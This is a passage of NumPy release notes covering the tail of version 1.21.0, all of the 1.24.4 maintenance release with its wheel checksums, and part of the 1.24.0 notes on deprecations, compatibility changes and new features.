serializing with a version >= ``(3, 0)``.\n\nBoth are done by removing checks that are only relevant for Python 2,\nwhile still maintaining compatibility with arrays\nwhich might have been created by Python 2.\n\n(`gh-18657 <https://github.com/numpy/numpy/pull/18657>`__)\n\n\nChanges\n=======\n\n`numpy.piecewise` output class now matches the input class\n----------------------------------------------------------\nWhen `~numpy.ndarray` subclasses are used on input to `~numpy.piecewise`,\nthey are passed on to the functions. The output will now be of the\nsame subclass as well.\n\n(`gh-18110 <https://github.com/numpy/numpy/pull/18110>`__)\n\nEnable Accelerate Framework\n----------------------------\nWith the release of macOS 11.3, several different issues that numpy was\nencountering when using Accelerate Framework's implementation of BLAS and\nLAPACK should be resolved.  This change enables the Accelerate Framework as an\noption on macOS.  If additional issues are found, please file a bug report\nagainst Accelerate using the developer feedback assistant tool\n(https://developer.apple.com/bug-reporting/). We intend to address issues\npromptly and plan to continue supporting and updating our BLAS and LAPACK\nlibraries.\n\n(`gh-18874 <https://github.com/numpy/numpy/pull/18874>`__)\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    e4b31fd5cb97e50238b3dbb3487b2cb7  numpy-1.21.0-cp37-cp37m-macosx_10_9_x86_64.whl\n    111e09f3fddd8e14540cf56493dd786a  numpy-1.21.0-cp37-cp37m-manylinux_2_12_i686.manylinux2010_i686.whl\n    e2fc116043d1b91c627f3c8884151f33  numpy-1.21.0-cp37-cp37m-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    82e267da77628b96cdf8832e475f6ef3  numpy-1.21.0-cp37-cp37m-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    baa416fe77b840a19556f5d808eb3165  numpy-1.21.0-cp37-cp37m-manylinux_2_5_i686.manylinux1_i686.whl\n    aba24836f51bb0a855434c41de122e3d  numpy-1.21.0-cp37-cp37m-manylinux_2_5_x86_64.manylinux1_x86_64.whl\n    aa9f94fa6eabfa193902676825934196  numpy-1.21.0-cp37-cp37m-win32.whl\n    6d771c7670b95adb62627e383c883804  numpy-1.21.0-cp37-cp37m-win_amd64.whl\n    e6d77cae6054b738603415faf9cb4358  numpy-1.21.0-cp38-cp38-macosx_10_9_universal2.whl\n    9589cfe5a22f54956101b7131be5cabd  numpy-1.21.0-cp38-cp38-macosx_10_9_x86_64.whl\n    5faa22dffa53cfe7d1d40d48aa817670  numpy-1.21.0-cp38-cp38-macosx_11_0_arm64.whl\n    b81545a2924a201817d433c3bad0bc7d  numpy-1.21.0-cp38-cp38-manylinux_2_12_i686.manylinux2010_i686.whl\n    3e60589e3325a3583880bf6998cfaca6  numpy-1.21.0-cp38-cp38-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    baf409eb08b7462899d45c42a7c1d854  numpy-1.21.0-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    4f311de7973503dde6ad3915f158fd63  numpy-1.21.0-cp38-cp38-manylinux_2_5_i686.manylinux1_i686.whl\n    1a79926ad8d3dda573f5c2d8d06e0e38  numpy-1.21.0-cp38-cp38-manylinux_2_5_x86_64.manylinux1_x86_64.whl\n    0b39eb396a1d5983f6eb2075a867a1a6  numpy-1.21.0-cp38-cp38-win32.whl\n    5c8c3e94f5a55123b1a0d3a4df14b505  numpy-1.21.0-cp38-cp38-win_amd64.whl\n    c6e9fa30e82e3ca1551d2f048d4a1dc4  numpy-1.21.0-cp39-cp39-macosx_10_9_universal2.whl\n    96d7d3a438296bfc68b819b3624936a5  numpy-1.21.0-cp39-cp39-macosx_10_9_x86_64.whl\n    31cf2152b4151912be9d165633a7d8eb  numpy-1.21.0-cp39-cp39-macosx_11_0_arm64.whl\n    e49cd2db6ec712b8b1d516154b5a034a  numpy-1.21.0-cp39-cp39-manylinux_2_12_i686.manylinux2010_i686.whl\n    c10e13fef152ed1c64151c8b6f6d0799  numpy-1.21.0-cp39-cp39-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    a627acdfcd302807cf8592d5bd958d35  numpy-1.21.0-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    e2287cd16300b363d376b661646fded9  numpy-1.21.0-cp39-cp39-win32.whl\n    29d1bf596981d930bb1c95c944b4b3d8  numpy-1.21.0-cp39-cp39-win_amd64.whl\n    42d05fcbab6137a404be36f27fc254f0  numpy-1.21.0-pp37-pypy37_pp73-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    003e34bd2cba06e7fe299a864964ea24  numpy-1.21.0.tar.gz\n    930ebfdffd10fed701a7823691f02983  numpy-1.21.0.zip\n\nSHA256\n------\n::\n\n    d5caa946a9f55511e76446e170bdad1d12d6b54e17a2afe7b189112ed4412bb8  numpy-1.21.0-cp37-cp37m-macosx_10_9_x86_64.whl\n    ac4fd578322842dbda8d968e3962e9f22e862b6ec6e3378e7415625915e2da4d  numpy-1.21.0-cp37-cp37m-manylinux_2_12_i686.manylinux2010_i686.whl\n    598fe100b2948465cf3ed64b1a326424b5e4be2670552066e17dfaa67246011d  numpy-1.21.0-cp37-cp37m-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    7c55407f739f0bfcec67d0df49103f9333edc870061358ac8a8c9e37ea02fcd2  numpy-1.21.0-cp37-cp37m-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    75579acbadbf74e3afd1153da6177f846212ea2a0cc77de53523ae02c9256513  numpy-1.21.0-cp37-cp37m-manylinux_2_5_i686.manylinux1_i686.whl\n    cc367c86eb87e5b7c9592935620f22d13b090c609f1b27e49600cd033b529f54  numpy-1.21.0-cp37-cp37m-manylinux_2_5_x86_64.manylinux1_x86_64.whl\n    d89b0dc7f005090e32bb4f9bf796e1dcca6b52243caf1803fdd2b748d8561f63  numpy-1.21.0-cp37-cp37m-win32.whl\n    eda2829af498946c59d8585a9fd74da3f810866e05f8df03a86f70079c7531dd  numpy-1.21.0-cp37-cp37m-win_amd64.whl\n    1a784e8ff7ea2a32e393cc53eb0003eca1597c7ca628227e34ce34eb11645a0e  numpy-1.21.0-cp38-cp38-macosx_10_9_universal2.whl\n    bba474a87496d96e61461f7306fba2ebba127bed7836212c360f144d1e72ac54  numpy-1.21.0-cp38-cp38-macosx_10_9_x86_64.whl\n    fd0a359c1c17f00cb37de2969984a74320970e0ceef4808c32e00773b06649d9  numpy-1.21.0-cp38-cp38-macosx_11_0_arm64.whl\n    e4d5a86a5257843a18fb1220c5f1c199532bc5d24e849ed4b0289fb59fbd4d8f  numpy-1.21.0-cp38-cp38-manylinux_2_12_i686.manylinux2010_i686.whl\n    620732f42259eb2c4642761bd324462a01cdd13dd111740ce3d344992dd8492f  numpy-1.21.0-cp38-cp38-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    b9205711e5440954f861ceeea8f1b415d7dd15214add2e878b4d1cf2bcb1a914  numpy-1.21.0-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    ad09f55cc95ed8d80d8ab2052f78cc21cb231764de73e229140d81ff49d8145e  numpy-1.21.0-cp38-cp38-manylinux_2_5_i686.manylinux1_i686.whl\n    a1f2fb2da242568af0271455b89aee0f71e4e032086ee2b4c5098945d0e11cf6  numpy-1.21.0-cp38-cp38-manylinux_2_5_x86_64.manylinux1_x86_64.whl\n    e58ddb53a7b4959932f5582ac455ff90dcb05fac3f8dcc8079498d43afbbde6c  numpy-1.21.0-cp38-cp38-win32.whl\n    d2910d0a075caed95de1a605df00ee03b599de5419d0b95d55342e9a33ad1fb3  numpy-1.21.0-cp38-cp38-win_amd64.whl\n    a290989cd671cd0605e9c91a70e6df660f73ae87484218e8285c6522d29f6e38  numpy-1.21.0-cp39-cp39-macosx_10_9_universal2.whl\n    3537b967b350ad17633b35c2f4b1a1bbd258c018910b518c30b48c8e41272717  numpy-1.21.0-cp39-cp39-macosx_10_9_x86_64.whl\n    ccc6c650f8700ce1e3a77668bb7c43e45c20ac06ae00d22bdf6760b38958c883  numpy-1.21.0-cp39-cp39-macosx_11_0_arm64.whl\n    709884863def34d72b183d074d8ba5cfe042bc3ff8898f1ffad0209161caaa99  numpy-1.21.0-cp39-cp39-manylinux_2_12_i686.manylinux2010_i686.whl\n    bebab3eaf0641bba26039fb0b2c5bf9b99407924b53b1ea86e03c32c64ef5aef  numpy-1.21.0-cp39-cp39-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    cf680682ad0a3bef56dae200dbcbac2d57294a73e5b0f9864955e7dd7c2c2491  numpy-1.21.0-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    d95d16204cd51ff1a1c8d5f9958ce90ae190be81d348b514f9be39f878b8044a  numpy-1.21.0-cp39-cp39-win32.whl\n    2ba579dde0563f47021dcd652253103d6fd66165b18011dce1a0609215b2791e  numpy-1.21.0-cp39-cp39-win_amd64.whl\n    3c40e6b860220ed862e8097b8f81c9af6d7405b723f4a7af24a267b46f90e461  numpy-1.21.0-pp37-pypy37_pp73-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    b662c841b29848c04d9134f31dbaa7d4c8e673f45bb3a5f28d02f49c424d558a  numpy-1.21.0.tar.gz\n    e80fe25cba41c124d04c662f33f6364909b985f2eb5998aaa5ae4b9587242cce  numpy-1.21.0.zip\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.24.4": "==========================\nNumPy 1.24.4 is a maintenance release that fixes bugs and regressions discovered after the\n1.24.3 release. The Python versions supported by this release are 3.8-3.11.\n\nContributors\n============\n\nA total of 4 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Bas van Beek\n* Charles Harris\n* Sebastian Berg\n* Hongyang Peng +\n\nPull requests merged\n====================\n\nA total of 6 pull requests were merged for this release.\n\n* `23720 <https://github.com/numpy/numpy/pull/23720>`__: MAINT, BLD: Pin rtools to version 4.0 for Windows builds.\n* `23739 <https://github.com/numpy/numpy/pull/23739>`__: BUG: fix the method for checking local files for 1.24.x\n* `23760 <https://github.com/numpy/numpy/pull/23760>`__: MAINT: Copy rtools installation from install-rtools.\n* `23761 <https://github.com/numpy/numpy/pull/23761>`__: BUG: Fix masked array ravel order for A (and somewhat K)\n* `23890 <https://github.com/numpy/numpy/pull/23890>`__: TYP,DOC: Annotate and document the ``metadata`` parameter of...\n* `23994 <https://github.com/numpy/numpy/pull/23994>`__: MAINT: Update rtools installation\n\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    25049e3aee79dde29e7a498d3ad13379  numpy-1.24.4-cp310-cp310-macosx_10_9_x86_64.whl\n    579b5c357c918feaef4af03af8afb721  numpy-1.24.4-cp310-cp310-macosx_11_0_arm64.whl\n    c873a14fa4f0210884db9c05e2904286  numpy-1.24.4-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    110a13ac016286059f0658b52b3646c0  numpy-1.24.4-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    fa67218966c0aef4094867cad7703648  numpy-1.24.4-cp310-cp310-win32.whl\n    6ee768803d8ebac43ee0a04e628a69f9  numpy-1.24.4-cp310-cp310-win_amd64.whl\n    0c918c16b58cb7f6773ea7d76e0bdaff  numpy-1.24.4-cp311-cp311-macosx_10_9_x86_64.whl\n    20506ae8003faf097c6b3a8915b4140e  numpy-1.24.4-cp311-cp311-macosx_11_0_arm64.whl\n    902df9d5963e89d88a1939d94207857f  numpy-1.24.4-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    2543611d802c141c8276e4868b4d9619  numpy-1.24.4-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    37b23a4e4e148d61dd3a515ac5dbf7ec  numpy-1.24.4-cp311-cp311-win32.whl\n    25e9f6bee2b65ff2a87588e717f15165  numpy-1.24.4-cp311-cp311-win_amd64.whl\n    f39a0cc3655a482af7d300bcaff5978e  numpy-1.24.4-cp38-cp38-macosx_10_9_x86_64.whl\n    9ed27941388fdb392e8969169f3fc600  numpy-1.24.4-cp38-cp38-macosx_11_0_arm64.whl\n    dee3f0c7482f1dc8bd1cd27b9b028a2c  numpy-1.24.4-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    2cc0967af29df3caef9fb3520f14e071  numpy-1.24.4-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    8572a3a0973fa78355bcb5f737745b47  numpy-1.24.4-cp38-cp38-win32.whl\n    771c63f2ef0d31466bbb12362a532265  numpy-1.24.4-cp38-cp38-win_amd64.whl\n    5713d9dc3dff287fb72121fe1960c48d  numpy-1.24.4-cp39-cp39-macosx_10_9_x86_64.whl\n    4e6718e3b655219a2a733b4fa242ca32  numpy-1.24.4-cp39-cp39-macosx_11_0_arm64.whl\n    31487f9a52ef81f8f88ec7fce8738dad  numpy-1.24.4-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    ea597b30187e55eb16ee31631e66f60d  numpy-1.24.4-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    98adbf30c67154056474001c125f6188  numpy-1.24.4-cp39-cp39-win32.whl\n    49c444b0e572ef45f1d92c106a36004e  numpy-1.24.4-cp39-cp39-win_amd64.whl\n    cdddfdeac437b0f20b4e366f00b5c42e  numpy-1.24.4-pp38-pypy38_pp73-macosx_10_9_x86_64.whl\n    3778338c15628caa3abd61e6f7bd46ec  numpy-1.24.4-pp38-pypy38_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    e16bd49d5295dc1b01ed50d76229fb54  numpy-1.24.4-pp38-pypy38_pp73-win_amd64.whl\n    3f3995540a17854a29dc79f8eeecd832  numpy-1.24.4.tar.gz\n\nSHA256\n------\n::\n\n    c0bfb52d2169d58c1cdb8cc1f16989101639b34c7d3ce60ed70b19c63eba0b64  numpy-1.24.4-cp310-cp310-macosx_10_9_x86_64.whl\n    ed094d4f0c177b1b8e7aa9cba7d6ceed51c0e569a5318ac0ca9a090680a6a1b1  numpy-1.24.4-cp310-cp310-macosx_11_0_arm64.whl\n    79fc682a374c4a8ed08b331bef9c5f582585d1048fa6d80bc6c35bc384eee9b4  numpy-1.24.4-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    7ffe43c74893dbf38c2b0a1f5428760a1a9c98285553c89e12d70a96a7f3a4d6  numpy-1.24.4-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    4c21decb6ea94057331e111a5bed9a79d335658c27ce2adb580fb4d54f2ad9bc  numpy-1.24.4-cp310-cp310-win32.whl\n    b4bea75e47d9586d31e892a7401f76e909712a0fd510f58f5337bea9572c571e  numpy-1.24.4-cp310-cp310-win_amd64.whl\n    f136bab9c2cfd8da131132c2cf6cc27331dd6fae65f95f69dcd4ae3c3639c810  numpy-1.24.4-cp311-cp311-macosx_10_9_x86_64.whl\n    e2926dac25b313635e4d6cf4dc4e51c8c0ebfed60b801c799ffc4c32bf3d1254  numpy-1.24.4-cp311-cp311-macosx_11_0_arm64.whl\n    222e40d0e2548690405b0b3c7b21d1169117391c2e82c378467ef9ab4c8f0da7  numpy-1.24.4-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    7215847ce88a85ce39baf9e89070cb860c98fdddacbaa6c0da3ffb31b3350bd5  numpy-1.24.4-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    4979217d7de511a8d57f4b4b5b2b965f707768440c17cb70fbf254c4b225238d  numpy-1.24.4-cp311-cp311-win32.whl\n    b7b1fc9864d7d39e28f41d089bfd6353cb5f27ecd9905348c24187a768c79694  numpy-1.24.4-cp311-cp311-win_amd64.whl\n    1452241c290f3e2a312c137a9999cdbf63f78864d63c79039bda65ee86943f61  numpy-1.24.4-cp38-cp38-macosx_10_9_x86_64.whl\n    04640dab83f7c6c85abf9cd729c5b65f1ebd0ccf9de90b270cd61935eef0197f  numpy-1.24.4-cp38-cp38-macosx_11_0_arm64.whl\n    a5425b114831d1e77e4b5d812b69d11d962e104095a5b9c3b641a218abcc050e  numpy-1.24.4-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    dd80e219fd4c71fc3699fc1dadac5dcf4fd882bfc6f7ec53d30fa197b8ee22dc  numpy-1.24.4-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    4602244f345453db537be5314d3983dbf5834a9701b7723ec28923e2889e0bb2  numpy-1.24.4-cp38-cp38-win32.whl\n    692f2e0f55794943c5bfff12b3f56f99af76f902fc47487bdfe97856de51a706  numpy-1.24.4-cp38-cp38-win_amd64.whl\n    2541312fbf09977f3b3ad449c4e5f4bb55d0dbf79226d7724211acc905049400  numpy-1.24.4-cp39-cp39-macosx_10_9_x86_64.whl\n    9667575fb6d13c95f1b36aca12c5ee3356bf001b714fc354eb5465ce1609e62f  numpy-1.24.4-cp39-cp39-macosx_11_0_arm64.whl\n    f3a86ed21e4f87050382c7bc96571755193c4c1392490744ac73d660e8f564a9  numpy-1.24.4-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    d11efb4dbecbdf22508d55e48d9c8384db795e1b7b51ea735289ff96613ff74d  numpy-1.24.4-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    6620c0acd41dbcb368610bb2f4d83145674040025e5536954782467100aa8835  numpy-1.24.4-cp39-cp39-win32.whl\n    befe2bf740fd8373cf56149a5c23a0f601e82869598d41f8e188a0e9869926f8  numpy-1.24.4-cp39-cp39-win_amd64.whl\n    31f13e25b4e304632a4619d0e0777662c2ffea99fcae2029556b17d8ff958aef  numpy-1.24.4-pp38-pypy38_pp73-macosx_10_9_x86_64.whl\n    95f7ac6540e95bc440ad77f56e520da5bf877f87dca58bd095288dce8940532a  numpy-1.24.4-pp38-pypy38_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    e98f220aa76ca2a977fe435f5b04d7b3470c0a2e6312907b37ba6068f26787f2  numpy-1.24.4-pp38-pypy38_pp73-win_amd64.whl\n    80f5e3a4e498641401868df4208b74581206afbee7cf7b8329daae82676d9463  numpy-1.24.4.tar.gz\n\n\n.. currentmodule:: numpy\n\n========================\nNumPy 1.24 Release Notes\n========================\nThe NumPy 1.24.0 release continues the ongoing work to improve the handling and\npromotion of dtypes, increase the execution speed, and clarify the\ndocumentation.  There are also a large number of new and expired deprecations\ndue to changes in promotion and cleanups. This might be called a deprecation\nrelease. Highlights are\n\n* Many new deprecations, check them out.\n* Many expired deprecations,\n* New F2PY features and fixes.\n* New \"dtype\" and \"casting\" keywords for stacking functions.\n\nSee below for the details,\n\nThis release supports Python versions 3.8-3.11.\n\n\nDeprecations\n============\n\nDeprecate fastCopyAndTranspose and PyArray_CopyAndTranspose\n-----------------------------------------------------------\nThe ``numpy.fastCopyAndTranspose`` function has been deprecated. Use the\ncorresponding copy and transpose methods directly::\n\n    arr.T.copy()\n\nThe underlying C function ``PyArray_CopyAndTranspose`` has also been deprecated\nfrom the NumPy C-API.\n\n(`gh-22313 <https://github.com/numpy/numpy/pull/22313>`__)\n\nConversion of out-of-bound Python integers\n------------------------------------------\nAttempting a conversion from a Python integer to a NumPy value will now always\ncheck whether the result can be represented by NumPy.  This means the following\nexamples will fail in the future and give a ``DeprecationWarning`` now::\n\n    np.uint8(-1)\n    np.array([3000], dtype=np.int8)\n\nMany of these did succeed before.  Such code was mainly useful for unsigned\nintegers with negative values such as ``np.uint8(-1)`` giving\n``np.iinfo(np.uint8).max``.\n\nNote that conversion between NumPy integers is unaffected, so that\n``np.array(-1).astype(np.uint8)`` continues to work and use C integer overflow\nlogic.  For negative values, it will also work to view the array:\n``np.array(-1, dtype=np.int8).view(np.uint8)``.\nIn some cases, using ``np.iinfo(np.uint8).max`` or ``val % 2**8`` may also\nwork well.\n\nIn rare cases input data may mix both negative values and very large unsigned\nvalues (i.e. ``-1`` and ``2**63``).  There it is unfortunately necessary\nto use ``%`` on the Python value or use signed or unsigned conversion\ndepending on whether negative values are expected.\n\n(`gh-22385 <https://github.com/numpy/numpy/pull/22385>`__)\n\nDeprecate ``msort``\n-------------------\nThe ``numpy.msort`` function is deprecated. Use ``np.sort(a, axis=0)`` instead.\n\n(`gh-22456 <https://github.com/numpy/numpy/pull/22456>`__)\n\n``np.str0`` and similar are now deprecated\n------------------------------------------\nThe scalar type aliases ending in a 0 bit size: ``np.object0``, ``np.str0``,\n``np.bytes0``, ``np.void0``, ``np.int0``, ``np.uint0`` as well as ``np.bool8``\nare now deprecated and will eventually be removed.\n\n(`gh-22607 <https://github.com/numpy/numpy/pull/22607>`__)\n\n\nExpired deprecations\n====================\n\n* The ``normed`` keyword argument has been removed from\n  `np.histogram`, `np.histogram2d`, and `np.histogramdd`.\n  Use ``density`` instead.  If ``normed`` was passed by\n  position, ``density`` is now used.\n\n  (`gh-21645 <https://github.com/numpy/numpy/pull/21645>`__)\n\n* Ragged array creation will now always raise a ``ValueError`` unless\n  ``dtype=object`` is passed.  This includes very deeply nested sequences.\n\n  (`gh-22004 <https://github.com/numpy/numpy/pull/22004>`__)\n\n* Support for Visual Studio 2015 and earlier has been removed.\n\n* Support for the Windows Interix POSIX interop layer has been removed.\n\n  (`gh-22139 <https://github.com/numpy/numpy/pull/22139>`__)\n\n* Support for Cygwin < 3.3 has been removed.\n\n  (`gh-22159 <https://github.com/numpy/numpy/pull/22159>`__)\n\n* The mini() method of ``np.ma.MaskedArray`` has been removed. Use either\n  ``np.ma.MaskedArray.min()`` or ``np.ma.minimum.reduce()``.\n\n* The single-argument form of ``np.ma.minimum`` and ``np.ma.maximum`` has been\n  removed. Use ``np.ma.minimum.reduce()`` or ``np.ma.maximum.reduce()``\n  instead.\n\n  (`gh-22228 <https://github.com/numpy/numpy/pull/22228>`__)\n\n* Passing dtype instances other than the canonical (mainly native byte-order)\n  ones to ``dtype=`` or ``signature=`` in ufuncs will now raise a\n  ``TypeError``.  We recommend passing the strings ``\"int8\"`` or scalar types\n  ``np.int8`` since the byte-order, datetime/timedelta unit, etc. are never\n  enforced.  (Initially deprecated in NumPy 1.21.)\n\n  (`gh-22540 <https://github.com/numpy/numpy/pull/22540>`__)\n\n* The ``dtype=`` argument to comparison ufuncs is now applied correctly.  That\n  means that only ``bool`` and ``object`` are valid values and ``dtype=object``\n  is enforced.\n\n  (`gh-22541 <https://github.com/numpy/numpy/pull/22541>`__)\n\n* The deprecation for the aliases ``np.object``, ``np.bool``, ``np.float``,\n  ``np.complex``, ``np.str``, and ``np.int`` is expired (introduces NumPy\n  1.20).  Some of these will now give a FutureWarning in addition to raising an\n  error since they will be mapped to the NumPy scalars in the future.\n\n  (`gh-22607 <https://github.com/numpy/numpy/pull/22607>`__)\n\n\nCompatibility notes\n===================\n\n``array.fill(scalar)`` may behave slightly different\n----------------------------------------------------\n``numpy.ndarray.fill`` may in some cases behave slightly different now due to\nthe fact that the logic is aligned with item assignment::\n\n    arr = np.array([1])   with any dtype/value\n    arr.fill(scalar)\n     is now identical to:\n    arr[0] = scalar\n\nPreviously casting may have produced slightly different answers when using\nvalues that could not be represented in the target ``dtype`` or when the target\nhad ``object`` dtype.\n\n(`gh-20924 <https://github.com/numpy/numpy/pull/20924>`__)\n\nSubarray to object cast now copies\n----------------------------------\nCasting a dtype that includes a subarray to an object will now ensure a copy of\nthe subarray.  Previously an unsafe view was returned::\n\n    arr = np.ones(3, dtype=[(\"f\", \"i\", 3)])\n    subarray_fields = arr.astype(object)[0]\n    subarray = subarray_fields[0]   \"f\" field\n\n    np.may_share_memory(subarray, arr)\n\nIs now always false.  While previously it was true for the specific cast.\n\n(`gh-21925 <https://github.com/numpy/numpy/pull/21925>`__)\n\nReturned arrays respect uniqueness of dtype kwarg objects\n---------------------------------------------------------\nWhen the ``dtype`` keyword argument is used with :py:func:`np.array()` or\n:py:func:`asarray()`, the dtype of the returned array now always exactly\nmatches the dtype provided by the caller.\n\nIn some cases this change means that a *view* rather than the input array is\nreturned.  The following is an example for this on 64bit Linux where ``long``\nand ``longlong`` are the same precision but different ``dtypes``::\n\n    >>> arr = np.array([1, 2, 3], dtype=\"long\")\n    >>> new_dtype = np.dtype(\"longlong\")\n    >>> new = np.asarray(arr, dtype=new_dtype)\n    >>> new.dtype is new_dtype\n    True\n    >>> new is arr\n    False\n\nBefore the change, the ``dtype`` did not match because ``new is arr`` was\n``True``.\n\n(`gh-21995 <https://github.com/numpy/numpy/pull/21995>`__)\n\nDLPack export raises ``BufferError``\n------------------------------------\nWhen an array buffer cannot be exported via DLPack a ``BufferError`` is now\nalways raised where previously ``TypeError`` or ``RuntimeError`` was raised.\nThis allows falling back to the buffer protocol or ``__array_interface__`` when\nDLPack was tried first.\n\n(`gh-22542 <https://github.com/numpy/numpy/pull/22542>`__)\n\nNumPy builds are no longer tested on GCC-6\n------------------------------------------\nUbuntu 18.04 is deprecated for GitHub actions and GCC-6 is not available on\nUbuntu 20.04, so builds using that compiler are no longer tested. We still test\nbuilds using GCC-7 and GCC-8.\n\n(`gh-22598 <https://github.com/numpy/numpy/pull/22598>`__)\n\n\nNew Features\n============\n\nNew attribute ``symbol`` added to polynomial classes\n----------------------------------------------------\nThe polynomial classes in the ``numpy.polynomial`` package have a new\n``symbol`` attribute which is used to represent the indeterminate of the\npolynomial.  This can be used to change the value of the variable when\nprinting::\n\n    >>> P_y = np.polynomial.Polynomial([1, 0, -1], symbol=\"y\")\n    >>> print(P_y)\n    1.0 + 0.0\u00b7y\u00b9 - 1.0\u00b7y\u00b2\n\nNote that the polynomial classes only support 1D polynomials, so operations\nthat involve polynomials with different symbols are disallowed when the result\nwould be multivariate::\n\n    >>> P = np.polynomial.Polynomial([1, -1])   default symbol is \"x\"\n    >>> P_z = np.polynomial.Polynomial([1, 1], symbol=\"z\")\n    >>> P * P_z\n    Traceback (most recent call last)\n       ...\n    ValueError: Polynomial symbols differ\n\nThe symbol can be any valid Python identifier. The default is ``symbol=x``,\nconsistent with existing behavior.\n\n(`gh-16154 <https://github.com/numpy/numpy/pull/16154>`__)\n\nF2PY support for Fortran ``character`` strings\n----------------------------------------------\nF2PY now supports wrapping Fortran functions with:\n\n* character (e.g. ``character x``)\n* character array (e.g. ``character, dimension(n) :: x``)\n* character string (e.g. ``character(len=10) x``)\n* and character string array (e.g. ``character(len=10), dimension(n, m) :: x``)\n\narguments, including passing Python unicode strings as Fortran character string\narguments.\n\n(`gh-19388 <https://github.com/numpy/numpy/pull/19388>`__)\n\nNew function ``np.show_runtime``\n--------------------------------\nA new function ``numpy.show_runtime`` has been added to display the runtime\ninformation of the machine in addition to ``numpy.show_config`` which displays\nthe build-related information.\n\n(`gh-21468 <https://github.com/numpy/numpy/pull/21468>`__)\n\n``strict`` option for ``testing.assert_array_equal``\n----------------------------------------------------\nThe ``strict`` option is now available for ``testing.assert_array_equal``.\nSetting ``strict=True`` will disable the broadcasting behaviour for scalars and\nensure that input arrays have the same data type.\n\n(`gh-21595 <https://github.com/numpy/numpy/pull/21595>`__)\n\nNew parameter ``equal_nan`` added to ``np.unique``\n--------------------------------------------------\n``np.unique`` was changed in 1.21 to treat all ``NaN`` values as equal and\nreturn a single ``NaN``. Setting ``equal_nan=False`` will restore pre-1.21\nbehavior to treat ``NaNs`` as unique. Defaults to ``True``.\n\n(`gh-21623 <https://github.com/numpy/numpy/pull/21623>`__)\n\n``casting`` and ``dtype`` keyword arguments for ``numpy.stack``\n---------------------------------------------------------------\nThe ``casting`` and ``dtype`` keyword arguments are now available for\n``numpy.stack``.  To use them, write ``np.stack(..., dtype=None,\ncasting='same_kind')``.\n\n``casting`` and ``dtype`` keyword arguments for ``numpy.vstack``\n----------------------------------------------------------------\nThe ``casting`` and ``dtype`` keyword arguments are now available for\n``numpy.vstack``.  To use them, write ``np.vstack(..., dtype=None,\ncasting='same_kind')``.\n\n``casting`` and ``dtype`` keyword arguments for ``numpy.hstack``\n----------------------------------------------------------------\nThe ``casting`` and ``dtype`` keyword arguments are now available for\n``numpy.hstack``.  To use them, write ``np.hstack(..., dtype=None,\ncasting='same_kind')``.\n\n(`gh-21627 <https://github.com/numpy/numpy/pull/21627>`__)\n\nThe bit generator underlying the singleton RandomState can be changed\n---------------------------------------------------------------------\nThe singleton ``RandomState`` instance exposed in the ``numpy.random`` module\nis initialized at startup with the ``MT19937`` bit generator. The new function\n``set_bit_generator`` allows the default bit generator to be replaced with a\nuser-provided bit generator. This function has been introduced to provide a\nmethod allowing seamless integration of a high-quality, modern bit generator in\nnew code with existing code that makes use of the singleton-provided random\nvariate generating functions. The companion function ``get_bit_generator``\nreturns the current bit generator being used by the singleton ``RandomState``.\nThis is provided to simplify restoring the original source of randomness if\nrequired.\n\nThe preferred method to generate reproducible random numbers is to use a modern\nbit generator in an instance of ``Generator``. The function ``default_rng``\nsimplifies instantiation::\n\n   >>> rg = np.random.default_rng(3728973198)\n   >>> rg.random()\n\nThe same bit generator can then be shared with the singleton instance so that\ncalling functions in the ``random`` module will use the same bit generator::\n\n   >>> orig_bit_gen = np.random.get_bit_generator()\n   >>> np.random.set_bit_generator(rg.bit_generator)\n   >>> np.random.normal()\n\nThe swap is permanent (until reversed) and so any call to functions in the\n``random`` module will use the new bit generator. The original can be restored\nif required for code to run correctly::\n\n   >>> np.random.set_bit_generator(orig_bit_gen)\n\n(`gh-21976 <https://github.com/numpy/numpy/pull/21976>`__)\n\n``np.void`` now has a ``dtype`` argument\n----------------------------------------\nNumPy now allows constructing structured void scalars directly by\npassing the ``dtype`` argument to ``np.void``.\n\n(`gh-22316 <https://github.com/numpy/numpy/pull/22316>`__)\n\n\nImprovements\n============\n\nF2PY Improvements\n-----------------\n* The generated extension modules don't use the deprecated NumPy-C API anymore\n* Improved ``f2py`` generated exception messages\n* Numerous bug and ``flake8`` warning fixes\n* various 